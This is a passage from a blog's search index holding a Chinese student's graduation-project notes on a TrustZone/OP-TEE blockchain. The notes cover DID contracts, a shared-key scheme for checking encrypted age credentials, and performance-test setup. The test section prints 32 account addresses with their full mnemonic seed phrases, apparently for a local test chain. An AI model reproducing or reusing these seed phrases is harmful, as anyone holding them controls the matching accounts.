class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> did, private_key.private_numbers().private_value.to_bytes(<span class=\"number\">32</span>, <span class=\"string\">'big'</span>).<span class=\"built_in\">hex</span>(), did_document</span><br></pre></td></tr></table></figure>\n<p>用户在本地创建Curve25519密钥对，把公钥发送给智能合约，让智能合约创建文档并保存。</p>\n<p>did由公钥生成。</p>\n<h1 id=\"did合约\">DID合约</h1>\n<p>DID合约链上状态有：</p>\n<ul>\n<li>DID文档：\n<ul>\n<li>key：did</li>\n<li>value：json格式的字符串</li>\n</ul></li>\n<li>区块链公钥：\n<ul>\n<li>key：<code>TEE_SECP256R1_PUBLIC_KEY</code></li>\n<li>value：公钥的值（私钥在TEE的加密存储区域）</li>\n</ul></li>\n<li>可信VC颁发机构的did：\n<ul>\n<li>key: <code>VCISSUER</code></li>\n<li>value: 政府的did</li>\n</ul></li>\n</ul>\n<p>任务：</p>\n<ul>\n<li>保存创建并保存政府的DID文档。\n<ul>\n<li>消息传入政府公钥，直接创建文档。更新DID文档和VCISSUER。</li>\n</ul></li>\n<li>保存TEE公钥。\n<ul>\n<li>调用 TEE 外部函数接口，获取公钥。</li>\n</ul></li>\n</ul>\n<p>传输的公钥格式为Base64URL 编码的 （X 坐标 + Y 坐标）。</p>\n<h1 id=\"乱记\">乱记</h1>\n<p>现在政府已经可以实例化智能合约。</p>\n<p>下面创建用户端网页，可以创建智能合约。</p>\n<p>VC好了。</p>\n<p>现在要写一个和区块链加密通讯的代码。</p>\n<p>用户用区块链的公钥和自己的私钥计算共享密钥，对称加密VC（可验证凭证，内含用户生日）。</p>\n<p>用户将对称加密的VC发送给电影院，电影院发送给区块链验证用户是否已满十八岁。</p>\n<p>区块链获取用户的公钥，计算共享密钥，解密VC。进一步验证VC，验证年龄，返回一个结果，实现零知识证明。</p>\n<p>问题：怎么在多个区块链节点里生成同一个对称加密的共享密钥？</p>\n<h1 id=\"其他\">其他</h1>\n<p>思考一个问题：DID文档有必要加密保存吗？</p>\n<p>里面存的核心内容，就是 did\n对应公钥。而did本身就是等价于公钥，这有什么弊端呢？没什么弊端。</p>\n<p>链上保存的内容确实没必要加密，但是用户提供 VC 的时候可以加密 VC\n。这样基于可信执行环境实现零知识证明。</p>\n<p>DID文档不加密，还可以把验证用户签名的过程挪到链外，降低区块链负担。</p>\n<p>结论：链上状态全部不加密，提供 VC 证明时加密。</p>\n","categories":["笔记"],"tags":["智能合约","毕设","Rust"]},{"title":"毕设20 - 共享密钥方案","url":"/graduation-project/20/","content":"<p>最后一个问题，如何让多个区块链节点可以共享一个私钥，或是共享不同私钥的但是均可以独立解密用户提供的数据。</p>\n<span id=\"more\"></span>\n<h1 id=\"解决方案统一共享私钥结合tee安全存储\">解决方案：统一共享私钥结合TEE安全存储</h1>\n<ol type=\"1\">\n<li><strong>系统初始化阶段</strong>：\n<ul>\n<li>在区块链网络部署前，生成一个统一的<strong>椭圆曲线密钥对</strong>（如ECDH密钥对），包含一个公共的公钥和一个私钥。</li>\n<li>将该私钥<strong>安全注入</strong>每个区块链节点的TEE（TrustZone）安全存储中。由于TEE的保护，私钥无法被外部读取或导出，但可在TEE内部用于密码学操作。</li>\n</ul></li>\n<li><strong>用户加密流程</strong>：\n<ul>\n<li>用户使用自己的私钥（如用户钱包的私钥）和区块链的<strong>统一公钥</strong>，通过密钥协商协议（如ECDH）生成共享密钥。</li>\n<li>用该共享密钥对VC（包含生日信息）进行<strong>对称加密</strong>（如AES-GCM），生成密文。</li>\n<li>用户将加密后的VC发送给电影院。</li>\n</ul></li>\n<li><strong>区块链节点解密验证</strong>：\n<ul>\n<li>电影院将加密的VC转发至区块链网络。</li>\n<li>每个区块链节点在TEE内使用注入的统一私钥和用户的公钥，通过相同的密钥协商协议（ECDH）<strong>重新生成共享密钥</strong>。</li>\n<li>节点在TEE内用共享密钥解密VC，验证凭证的有效性（如签名、过期时间）和年龄是否满18岁。</li>\n<li>节点生成<strong>零知识证明</strong>（如范围证明），证明解密后的年龄满足条件，无需泄露具体生日。</li>\n</ul></li>\n<li><strong>去中心化与安全性</strong>：\n<ul>\n<li>所有节点独立验证和解密，确保去中心化特性。</li>\n<li>私钥始终在TEE内受保护，即使单个节点被物理攻击，私钥也不会泄露。</li>\n</ul></li>\n</ol>\n<h2 id=\"关键点与优化\">关键点与优化</h2>\n<ul>\n<li><strong>统一私钥的安全性</strong>：依赖TEE的安全机制（如TrustZone）确保私钥无法被提取。即使攻击者物理访问节点设备，也无法获取私钥明文。</li>\n<li><strong>动态密钥更新</strong>：为避免长期使用同一私钥的风险，可定期通过安全协议（如TEE安全通道）轮换统一私钥，所有节点同步更新。区块链运行一定时间后（产生一定数量的区块后），重新生成一次共享私钥。这也自动实现了VC过期间。</li>\n</ul>\n<h2 id=\"对抗性分析\">对抗性分析</h2>\n<ul>\n<li><strong>私钥泄露风险</strong>：由于私钥统一存储，若TEE被大规模攻破（理论上极难），整个网络可能受损。可通过门限签名方案改进（如私钥分片存储，需多节点协作解密），但会增加复杂性。</li>\n</ul>\n<h2 id=\"总结\">总结</h2>\n<p>通过预置统一私钥到所有节点的TEE中，利用密钥协商协议（ECDH）生成相同共享密钥，实现去中心化节点对加密VC的独立解密和验证。TEE保障私钥安全，零知识证明保护用户隐私，平衡安全性与去中心化需求。</p>\n<h1 id=\"生成共享私钥并注入所有trustzone\">生成共享私钥并注入所有TrustZone</h1>\n<h2 id=\"生成共享密钥\">1. 生成共享密钥</h2>\n<p>我觉得统一共享私钥的方案很合理。那么现在遇到另一个问题，如何<strong>安全的</strong>生成相同的共享密钥？</p>\n<p>区块链节点运行在TrustZone中，REE部分执行非安全操作（如网络和共识），TEE部分用于执行安全操作（如智能合约、密码学操作）</p>\n<p>以下是我想到的几个方案：</p>\n<ul>\n<li>固定一个随机种子，让所有节点生成同一份私钥：\n<ul>\n<li>如果在REE中生成私钥，私钥就有泄露风险。</li>\n<li>如果在REE中生成相同的随机种子，TEE根据随机种子生成私钥？也不可行，如果泄露了随机种子，外界也可以计算出私钥。</li>\n<li>如果在TEE内部生成随机种子？不可行，不同的TEE节点无法保证生成相同的随机数。</li>\n</ul></li>\n<li>在一个TEE中生成私钥对，以某种方式广播私钥？\n<ul>\n<li>首先OPTEE生成的私钥无法获取（也许可以修改代码想办法提取私钥）</li>\n<li>如果OPTEE的私钥可以获取，如何广播私钥？\n<ul>\n<li>其他节点生成一个临时密钥对，并广播自己的公钥</li>\n<li><strong>新私钥生成节点\n</strong>接受所有公钥，分别用公钥加密新私钥，广播加密后的新私钥</li>\n<li>其他节点收到加密后的私钥，用自己的临时私钥解密</li>\n</ul></li>\n<li>缺点：\n<ul>\n<li>可能无法提取私钥</li>\n<li>广播过程、反复加密解密的过程，导致效率极低</li>\n</ul></li>\n</ul></li>\n<li>（摆烂方案）预先生成一个私钥，在区块链节点部署前注入TrustZone。在该系统的威胁模型中假如“假设共享私钥不会泄露”。</li>\n</ul>\n<p>我认为上述方案都不够好，有更好的方案吗？或者我的方案可以修改成实际可行的吗？</p>\n<p>Deepseek和ChatGPT都提供了<strong>门限秘密共享（Threshold Secret\nSharing）</strong>和<strong>安全多方计算（MPC）</strong>的方案。</p>\n<p>但是都有一个前提，需要多个节点共同运作才能解密。</p>\n<p>而且，这个过程需要在多个TEE节点之间建立安全通道。既然可以这样做，那么直接在多个TEE之间共性同一个秘钥也是可行的。门限秘密共享方案仅仅实现了<strong>单一节点的私钥泄露不会破坏系统安全性</strong>。但是该系统威胁模型就是<strong>TEE无法被攻陷</strong>。</p>\n<p>所以回到最初的方案，获取秘钥。</p>\n<h2 id=\"秘钥注入trustzone\">2. 秘钥注入TrustZone</h2>\n<p>这一步简单，只要OPTEE支持有一种方式传入私钥即可。</p>\n<h1 id=\"完成\">完成！！！</h1>\n<p>剩余工作，整理代码存到github上。</p>\n<p>在香橙派中运行多个节点，进行多节点的功能测试和性能测试。</p>\n<p>写毕业论文，准备毕业答辩。</p>\n<h1 id=\"存在的问题即解决思路\">存在的问题即解决思路</h1>\n<h2 id=\"问题1tee与ree通信的反向调用机制\">问题1：TEE与REE通信的反向调用机制</h2>\n<p><strong>问题描述</strong>：\nOP-TEE架构将系统分为可信执行环境(TEE)和富执行环境(REE)，传统上只支持REE向TEE发起请求的单向通信模式。在本毕业设计中，wasm智能合约运行在TEE的安全虚拟机中，但智能合约执行过程中需要实时访问和修改区块链状态数据，这些数据位于REE中。如何实现TEE中的智能合约能够主动向REE发起请求，突破传统TEE-REE通信的单向限制？</p>\n<p><strong>解决思路</strong>： 设计了基于共享内存的双向通信机制：</p>\n<ol type=\"1\">\n<li>在REE中申请一块共享内存区域，确保TEE和REE均有读写权限</li>\n<li>区块链节点在调用智能合约时分出两个并行线程：\n<ul>\n<li>主线程负责调用TEE中的智能合约</li>\n<li>监听线程持续轮询共享内存区域，检测来自TEE的请求</li>\n</ul></li>\n<li>实现了防止编译器优化的内存屏障机制，确保数据读写顺序正确</li>\n<li>设计了请求-响应协议，支持get/set等操作类型</li>\n<li>当智能合约需要访问链上数据时，将请求写入共享内存并设置标志位</li>\n<li>REE监听线程检测到请求后，执行相应操作并将结果写回共享内存</li>\n<li>TEE中的智能合约从共享内存获取结果继续执行</li>\n</ol>\n<p>这种机制实现了TEE到REE的反向调用，同时保持了TEE的安全隔离特性，不需要修改OP-TEE的核心架构。</p>\n<h2 id=\"问题2基于trustzone的隐私保护数字身份验证\">问题2：基于TrustZone的隐私保护数字身份验证</h2>\n<p><strong>问题描述</strong>：\n传统的分布式数字身份(DID)系统通常依赖纯数学层面的零知识证明算法，这些算法计算复杂且难以实现。如何利用ARM\nTrustZone提供的可信执行环境，设计一种更高效、更安全的隐私保护数字身份验证机制，充分发挥硬件可信根的优势？</p>\n<p><strong>解决思路</strong>： 设计了基于TEE的隐私保护验证流程：</p>\n<ol type=\"1\">\n<li>用户DID文档中包含一个ECDH公钥用于安全密钥交换</li>\n<li>区块链网络中的所有节点共享同一ECDH密钥对：\n<ul>\n<li>私钥安全存储在OP-TEE的隔离空间中，永不离开TEE</li>\n<li>公钥公开存储在区块链上，任何实体可获取</li>\n</ul></li>\n<li>用户通过区块链公钥与自身私钥计算共享密钥，使用该密钥对可验证凭证(VC)进行AES加密</li>\n<li>验证流程保护用户隐私：\n<ul>\n<li>验证机构无法直接解密用户VC，保护敏感信息</li>\n<li>验证请求转发至区块链节点的TEE环境</li>\n<li>TEE环境使用安全存储的私钥与用户公钥计算共享密钥</li>\n<li>在TEE内部解密VC并验证内容，仅向外部返回验证结果</li>\n</ul></li>\n<li>整个过程中敏感数据始终在TEE内处理，未加密数据不会暴露给REE</li>\n</ol>\n<p>这种方案将密码学保护与硬件隔离相结合，提供了比纯软件方案更强的安全保证，同时降低了计算复杂度。</p>\n<h2 id=\"问题3支持rust编写的复杂wasm智能合约\">问题3：支持Rust编写的复杂Wasm智能合约</h2>\n<p><strong>问题描述</strong>： 本毕业设计参考《WaTZ: A Trusted\nWebAssembly Runtime Environment with Remote Attestation for\nTrustZone》论文，在OP-TEE中实现了 wasm\n虚拟机。然而，论文中使用的WAMR(WebAssembly Micro\nRuntime)不支持WebAssembly的\"多内存提案\"(Multi-Memory\nProposal)特性，导致无法运行由Rust语言编译的复杂智能合约。Rust作为一种内存安全的系统级语言，非常适合编写智能合约，但其编译产生的Wasm模块通常依赖多内存特性和更复杂的内存管理机制。如何扩展TEE中的WebAssembly运行时，使其能够支持现代Rust编译的智能合约？</p>\n<p><strong>解决思路：</strong></p>\n<ol type=\"1\">\n<li>首先分析了Rust编译为wasm时的内存模型与C的区别：\n<ul>\n<li>C 语言编译的wasm使用简单的内存模型，直接调用malloc分配内存</li>\n<li>Rust需要自定义内存分配器，且默认会生成更复杂的内存管理代码</li>\n<li>通过实验对比发现Rust编译的wasm会使用多内存提案特性</li>\n</ul></li>\n<li>修改WAMR运行时和OP-TEE以支持多内存提案：\n<ul>\n<li>放弃使用论文中的旧版WAMR，迁移至最新版本的WebAssembly Micro\nRuntime</li>\n<li>重新实现了WAMR与OP-TEE的全部接口层，包括内存管理、系统时钟等</li>\n<li>在OP-TEE中实现了mprotect系统调用，修改内存区域的保护属性</li>\n</ul></li>\n<li>解决内存分配问题：\n<ul>\n<li>采用Rust的no_std模式编译，并引入轻量级内存分配器wee_alloc，显著降低内存开销</li>\n<li>根据TEE环境的实际内存限制，调整WAMR的内存模型参数</li>\n</ul></li>\n</ol>\n<p>通过以上方案，成功在OP-TEE的TEE环境中运行了由Rust编写的复杂wasm智能合约，解决了多内存提案支持问题，并克服了TEE环境下的内存限制。这使得可以在保证安全隔离的同时，利用Rust语言的安全特性开发更复杂、更可靠的智能合约。</p>\n<h2 id=\"下一阶段工作计划与研究内容\">下一阶段工作计划与研究内容</h2>\n<ol type=\"1\">\n<li><strong>多节点分布式测试环境搭建</strong>：\n<ul>\n<li>在多台华为香橙派开发板上部署完整的区块链节点</li>\n<li>构建基于局域网的区块链测试网络</li>\n</ul></li>\n<li><strong>功能测试与验证</strong>：\n<ul>\n<li>测试智能合约在多节点环境下的一致性执行</li>\n<li>验证节点间状态同步和共识机制的正确性</li>\n<li>进行各类异常情况下的系统恢复测试</li>\n</ul></li>\n<li><strong>性能测试与优化</strong>：\n<ul>\n<li>测量交易处理吞吐量和延迟</li>\n<li>分析TEE环境下智能合约执行效率</li>\n<li>评估系统在不同负载下的资源消耗</li>\n<li>比较与传统区块链系统的性能差异</li>\n</ul></li>\n<li><strong>安全性分析与评估</strong>：\n<ul>\n<li>进行系统安全威胁建模</li>\n<li>评估潜在攻击面和防御措施</li>\n</ul></li>\n<li><strong>毕业论文撰写毕业答辩准备</strong></li>\n</ol>\n","categories":["笔记"],"tags":["TrustZone","智能合约","毕设","密码学"]},{"title":"毕设21 - 性能测试","url":"/graduation-project/21/","content":"<p>来活了，给项目做一下性能测试。总之要有一些性能数据。</p>\n<span id=\"more\"></span>\n<h1 id=\"思考\">思考</h1>\n<p>要采集哪些数据？</p>\n<p>低频数据：</p>\n<ol type=\"1\">\n<li></li>\n</ol>\n<p>创建简单</p>\n<p>与REE中的wasm虚拟机对比</p>\n<p>simple counter 合约：</p>\n<ul>\n<li><p>200次query的时间 <a href=\"../../../../../Downloads/query_counter.csv\">query_counter.csv</a></p>\n<figure>\n<img src=\"/graduation-project/21/Simple%20Query.png\" alt=\"Simple Query\">\n<figcaption aria-hidden=\"true\">Simple Query</figcaption>\n</figure></li>\n<li><p>tx是异步执行的，所以并发可能会一定程度提升吞吐率。</p>\n<ul>\n<li>统计1~32个client，每次执行5分钟，的tps、平均等待时间。</li>\n</ul></li>\n</ul>\n<p>写一个 REE 中运行的 wasm 运行时，不包含安全原语：</p>\n<ul>\n<li>200次query的时间</li>\n<li>tx的吞吐率</li>\n</ul>\n<p>DID 合约：</p>\n<ol type=\"1\">\n<li>（tx）创建200个did的平均时间</li>\n<li>（query）加密200个VC的平均时间</li>\n<li>（query）验证200个VC的平均时间</li>\n</ol>\n<h1 id=\"创建多个账户\">创建多个账户</h1>\n<table>\n<colgroup>\n<col style=\"width: 40%\">\n<col style=\"width: 56%\">\n<col style=\"width: 3%\">\n</colgroup>\n<thead>\n<tr>\n<th>地址</th>\n<th>助记词</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>mini1s09httyypqw7r5r9p6htqkxu0dzsc8f620575d</td>\n<td>丢失</td>\n<td></td>\n</tr>\n<tr>\n<td>mini16rnyvqk8cku22lc7xtphntpkk0tnpc4tvj0jhd</td>\n<td>tomorrow point roof cover image sting clip inflict hello garage\nwisdom deny impose ask bulb axis duck love real apology fall notice wild\nmethod</td>\n<td>1</td>\n</tr>\n<tr>\n<td>mini1kw9nh8pwzmme72efegqxksyy4tcf2qff9w72dv</td>\n<td>identify mechanic twist actress sure ribbon ecology expose episode\nhumor place lobster slender march bachelor jazz suffer pyramid unaware\nfrost grain title gossip home</td>\n<td>2</td>\n</tr>\n<tr>\n<td>mini1lwl7d7hy8qd6mvt0rx39v2ug59vz60386znnku</td>\n<td>carpet much turkey cart family riot room major book tooth pelican\naddict riot ozone hire robot priority lab over giraffe trigger nephew\nclog visual</td>\n<td>3</td>\n</tr>\n<tr>\n<td>mini1329azw2hzftggc4wu5qe5t2873kwstptz0mszm</td>\n<td>addict matter this sock during erosion steak swift wool measure\nconvince soccer memory decade pottery record drama pretty mix gorilla\nvolcano current track rubber</td>\n<td>4</td>\n</tr>\n<tr>\n<td>mini15g0mnntkxg8htph0xf6e3yfffpa9c4hadg6ela</td>\n<td>army stone visa hybrid gate kind cover flame diet leave galaxy\nengage boss mechanic swarm offer narrow rice ozone fatal foil cannon\ncapable slot</td>\n<td>5</td>\n</tr>\n<tr>\n<td>mini1gknuy37wg9w539gnszlvpc6t4xsfqfv0kly5hr</td>\n<td>belt search lonely notice recycle lecture because shuffle nerve\nclever elder clay doll mixed scene cover elder web glory foam deer found\nmove marine</td>\n<td>6</td>\n</tr>\n<tr>\n<td>mini1pqjc95f8djmq7zp0lcu029rlm5u7mvgld4cpuu</td>\n<td>rich tape enrich juice claw police wolf usage current oil violin\nmass level finish true satisfy soon bundle exact pond scheme breeze\nresist soccer</td>\n<td>7</td>\n</tr>\n<tr>\n<td>mini1nppfg3zw8vd00fmacee7n80zepq54ujzzgcjqh</td>\n<td>huge liquid table bamboo laptop cage audit staff orange flush wealth\narmor differ west dash wasp unvel report head bunker now cute alone\nearn</td>\n<td>8</td>\n</tr>\n<tr>\n<td>mini1rs4jl36zh50mwtnw3cqd565rku5zrw3vqm4hum</td>\n<td>imitate satoshi spy develop lecture sick goose credit brave universe\nvalley negative pig wide galaxy green flush list essence return slight\nmiracle hire orphan</td>\n<td>9</td>\n</tr>\n<tr>\n<td>mini1l8f6wcfzhxu53sxysjq87ryg54785nrk3q0rf6</td>\n<td>shrimp dilemma series aware card impulse biology also car board damp\nstaff album false camera nerve jaguar snap then lumber garlic steel\ncharge clever</td>\n<td>10</td>\n</tr>\n<tr>\n<td>mini1hvtqxnu2g2anlx8ufzyl7hmsfx3pm6as2t9tsd</td>\n<td>monster chicken rice dream repeat mix match evidence essence rent\ncover much escape child denial rule shrug crawl brush swamp deposit\nexercise credit daring</td>\n<td>11</td>\n</tr>\n<tr>\n<td>mini1gfmtmfenhj9dq4qx2jjvajmmqcfayhtd9atm2p</td>\n<td>sketch kind goat panther slogan check pink twist gravity power catch\npunch dress wheel foot intact rhythm hidden buzz evil hurry strong\nalways job</td>\n<td>12</td>\n</tr>\n<tr>\n<td>mini1pqlm5thfdlnvdf37s8ns976wwv3ydqskzu8j03</td>\n<td>black shock buffalo print inch symptom uncover rice accuse road\nrepair tonight hawk injury injury clock knife local wise pottery own\nwrestle catalog thrive</td>\n<td>13</td>\n</tr>\n<tr>\n<td>mini1z4dmtxa5h6kqfwzn766jakz79mfzpg9edzngtl</td>\n<td>champion pistol useful cereal tell enhance journey depart estate\nsession never fashion limb version increase meat key juice enlist picnic\nbean wealth nasty ready</td>\n<td>14</td>\n</tr>\n<tr>\n<td>mini1cxt9dcmpwz53fyzhfptakfws09nlqa9cmx3ndu</td>\n<td>thunder blouse wife frame daring punch equal book hurry grow grass\ncrunch cluster damage census fashion program program blush fix special\nshoulder buzz vessel</td>\n<td>15</td>\n</tr>\n<tr>\n<td>mini19zngmq4fufx05sdn9gt9gd0dkjjy9e0gxq4yh5</td>\n<td>rally layer potato under car board bleak collect awesome demise\nblind firm daughter fresh benefit mimic nephew move awful vacuum joy\nahead margin village</td>\n<td>16</td>\n</tr>\n<tr>\n<td>mini1x3945pyuesyep4a8fu0vjeanv6cn0h5gnt03gj</td>\n<td>crucial poet ramp artefact lounge van fuel wrong keep gallery circle\nasset year merge flat session peanut grocery silk ladder owner kingdom\nstool antenna</td>\n<td>17</td>\n</tr>\n<tr>\n<td>mini1f4tev9wzfkt29dcpe0nfzak6rzuux45avcs7k7</td>\n<td>eager dice mystery electric portion cloud width ride mouse scare\nquick apple cattle picture wait regret ice eye thumb legend autumn loyal\ndescribe exhibit</td>\n<td>18</td>\n</tr>\n<tr>\n<td>mini18kfmhgc3eplw2z3xhlz4vwezqc60p8gnu5339k</td>\n<td>twenty mesh shoe version emerge romance bridge cannon owner monitor\ntrash impose liquid damp method unable hire metal village belt spend\ndance denial junior</td>\n<td>19</td>\n</tr>\n<tr>\n<td>mini1ygg8aw2x9u2fk4vetx3m2zjj66vm3gpmaxha7q</td>\n<td>best polar jaguar various donate emerge return solve rotate lyrics\nramp dinosaur nuclear still select industry host denial actor laundry\nbefore someone canoe start</td>\n<td>20</td>\n</tr>\n<tr>\n<td>mini1zxt2l9qdt6sxkxhcgpekkvwnsret273lwkaf6t</td>\n<td>claim spirit butter cricket raccoon club jacket country cook infant\nkiwi entry vibrant myself dice slight august ahead rotate frown uncle\nwire pill valley</td>\n<td>21</td>\n</tr>\n<tr>\n<td>mini15pz7z8v9kepd6rn805u773w9llllfx7tf03g3u</td>\n<td>mass attack summer lift law net sense peasant voice this behave desk\nclip orient pave walnut coil resource bronze giggle typical normal\npublic clerk</td>\n<td>22</td>\n</tr>\n<tr>\n<td>mini1qe89gve4dxcamqk0m96uxqf6q76mnguckpkuk5</td>\n<td>citizen similar donkey measure return domain mutual ozone valve upon\ncherry warm stem soup possible also fat clip urban question silent clip\ntable churn</td>\n<td>23</td>\n</tr>\n<tr>\n<td>mini1gefa64mj59a8l7la05dka8e5fmn04zplskk3rk</td>\n<td>crime caught birth ancient afraid parrot ritual feature shuffle\nblossom dash kangaroo anger love broken swing horn junior lava oven\ncigar august urge phone</td>\n<td>24</td>\n</tr>\n<tr>\n<td>mini1wd9aj6xlfqyqacw3fpsluwe2wwmd6sfjaqql7h</td>\n<td>art news holiday clay video gate guitar essence early chalk melt\nozone salad copy chimney dance subject indicate female sea broken\ninvolve dismiss pear</td>\n<td>25</td>\n</tr>\n<tr>\n<td>mini1y3zvucu8pp24xzwcqr2r2nurh6d795f96zsftc</td>\n<td>example lab charge spot cherry forum glide culture boy task forget\nwrong debate punch spider current vague doctor hole prosper mass enhance\nedge protect</td>\n<td>26</td>\n</tr>\n<tr>\n<td>mini1cjfytgrtj8kmu27mdu8e7pfc29e4609tk5seu8</td>\n<td>poet inch orient derive differ find material genre okay team unknown\ndefense clock much gate cube void return strategy emerge author swap\nenhance leg</td>\n<td>27</td>\n</tr>\n<tr>\n<td>mini1atwg4gj2l6axq6eus26r7sg42u9dvsjuaudhmg</td>\n<td>regret view tornado film camp into grape stock scorpion rose release\nspring grab galaxy left lawn lesson meat another diesel able toe coral\nevoke</td>\n<td>28</td>\n</tr>\n<tr>\n<td>mini1p8aa0cpt22fkmdugkh6d9f3u67h226pcz0q3qe</td>\n<td>bridge sister upgrade jeans annual crunch bird check casino size\ngarden march verb sunny favorite install other wall cheese radio process\nsmooth feature play</td>\n<td>29</td>\n</tr>\n<tr>\n<td>mini1jwdwn6mz9rdyejvfeu7dlup4hs80mu5yx32qem</td>\n<td>project ketchup athlete grief tone unveil race girl guide vicious\nagain pony sail robust shiver series betray volume pizza bronze achieve\ndesk mix business</td>\n<td>30</td>\n</tr>\n<tr>\n<td>mini1d0z4dq7a5xxqel776znr4cdcnk4kht003lvntd</td>\n<td>section person search brave emotion silk almost insane erase nose\nerosion refuse orange remove shuffle symbol charge rice green two gloom\nweapon list knock</td>\n<td>31</td>\n</tr>\n<tr>\n<td>mini1pmlwxv4z6m3gvgm5zp0r44sw7gxafjz0u4av07</td>\n<td>pattern crystal pattern decrease april estate rude patient often\nbrother salad husband immense disease absorb charge upset inflict census\nweird verify update loop chase</td>\n<td>32</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./minid tx bank send alice mini1s09httyypqw7r5r9p6htqkxu0dzsc8f620575d 3000000mini --yes</span><br><span class=\"line\"></span><br><span class=\"line\">./minid tx bank send alice mini16rnyvqk8cku22lc7xtphntpkk0tnpc4tvj0jhd 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1kw9nh8pwzmme72efegqxksyy4tcf2qff9w72dv 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1lwl7d7hy8qd6mvt0rx39v2ug59vz60386znnku 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1329azw2hzftggc4wu5qe5t2873kwstptz0mszm 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini15g0mnntkxg8htph0xf6e3yfffpa9c4hadg6ela 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1gknuy37wg9w539gnszlvpc6t4xsfqfv0kly5hr 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1pqjc95f8djmq7zp0lcu029rlm5u7mvgld4cpuu 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1nppfg3zw8vd00fmacee7n80zepq54ujzzgcjqh 3000000mini --yes</span><br><span class=\"line\"></span><br><span class=\"line\">./minid tx bank send alice mini1rs4jl36zh50mwtnw3cqd565rku5zrw3vqm4hum 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1l8f6wcfzhxu53sxysjq87ryg54785nrk3q0rf6 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1hvtqxnu2g2anlx8ufzyl7hmsfx3pm6as2t9tsd 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1gfmtmfenhj9dq4qx2jjvajmmqcfayhtd9atm2p 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1pqlm5thfdlnvdf37s8ns976wwv3ydqskzu8j03 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1z4dmtxa5h6kqfwzn766jakz79mfzpg9edzngtl 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1cxt9dcmpwz53fyzhfptakfws09nlqa9cmx3ndu 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini19zngmq4fufx05sdn9gt9gd0dkjjy9e0gxq4yh5 3000000mini --yes</span><br><span class=\"line\"></span><br><span class=\"line\">./minid tx bank send alice mini1x3945pyuesyep4a8fu0vjeanv6cn0h5gnt03gj 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1f4tev9wzfkt29dcpe0nfzak6rzuux45avcs7k7 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini18kfmhgc3eplw2z3xhlz4vwezqc60p8gnu5339k 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1ygg8aw2x9u2fk4vetx3m2zjj66vm3gpmaxha7q 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1zxt2l9qdt6sxkxhcgpekkvwnsret273lwkaf6t 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini15pz7z8v9kepd6rn805u773w9llllfx7tf03g3u 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1qe89gve4dxcamqk0m96uxqf6q76mnguckpkuk5 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1gefa64mj59a8l7la05dka8e5fmn04zplskk3rk 3000000mini --yes</span><br><span class=\"line\"></span><br><span class=\"line\">./minid tx bank send alice mini1wd9aj6xlfqyqacw3fpsluwe2wwmd6sfjaqql7h 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1y3zvucu8pp24xzwcqr2r2nurh6d795f96zsftc 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1cjfytgrtj8kmu27mdu8e7pfc29e4609tk5seu8 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1atwg4gj2l6axq6eus26r7sg42u9dvsjuaudhmg 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1p8aa0cpt22fkmdugkh6d9f3u67h226pcz0q3qe 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1jwdwn6mz9rdyejvfeu7dlup4hs80mu5yx32qem 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1d0z4dq7a5xxqel776znr4cdcnk4kht003lvntd 3000000mini --yes</span><br><span class=\"line\">./minid tx bank send alice mini1pmlwxv4z6m3gvgm5zp0r44sw7gxafjz0u4av07 3000000mini --yes</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid query swt contract-state mini1jvkf9e7agxj8ly7mnxxmaq6cpq5e3hc266nx7p47exgd067xnadqlm3ken count \"{}\"</span><br></pre></td></tr></table></figure>\n<p>命令行测试并发：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">minid tx swt execute mini1jvkf9e7agxj8ly7mnxxmaq6cpq5e3hc266nx7p47exgd067xnadqlm3ken increase_count \"{\\\"increase\\\": \\\"10\\\"}\" --from mywallet --gas 2000000 --yes</span><br><span class=\"line\">minid tx swt execute mini1jvkf9e7agxj8ly7mnxxmaq6cpq5e3hc266nx7p47exgd067xnadqlm3ken increase_count \"{\\\"increase\\\": \\\"10\\\"}\" --from client2 --gas 2000000 --yes</span><br></pre></td></tr></table></figure>\n<p>编译一个 AARCH64 REE 中的 wamr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cmake -DCMAKE_C_COMPILER=/root/optee/toolchains/aarch64/bin/aarch64-linux-gnu-gcc -DWAMR_BUILD_TARGET=AARCH64 ..</span><br></pre></td></tr></table></figure>\n<p>tps</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var option = {</span><br><span class=\"line\">  tooltip: {</span><br><span class=\"line\">    trigger: 'axis'</span><br><span class=\"line\">  